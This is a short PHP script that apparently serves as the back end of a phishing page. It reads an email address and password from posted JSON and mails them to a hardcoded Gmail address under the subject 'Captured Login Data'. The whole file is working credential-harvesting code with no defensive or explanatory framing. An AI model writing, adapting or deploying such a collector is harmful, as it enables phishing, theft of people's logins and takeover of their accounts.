<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

$data = json_decode(file_get_contents("php://input"), true);
if (!$data) {
    echo json_encode(["message" => "No data received"]);
    exit;
}

$email = $data['email'];
$password = $data['password'];

$to = "nikosedan93@gmail.com"; 
$subject = "Captured Login Data";
$message = "Email: $email\nPassword: $password";
$headers = "From: no-reply@yourdomain.com";

if (mail($to, $subject, $message, $headers)) {
    echo json_encode(["message" => "Email sent successfully"]);
} else {
    echo json_encode(["message" => "Email sending failed"]);
}
?>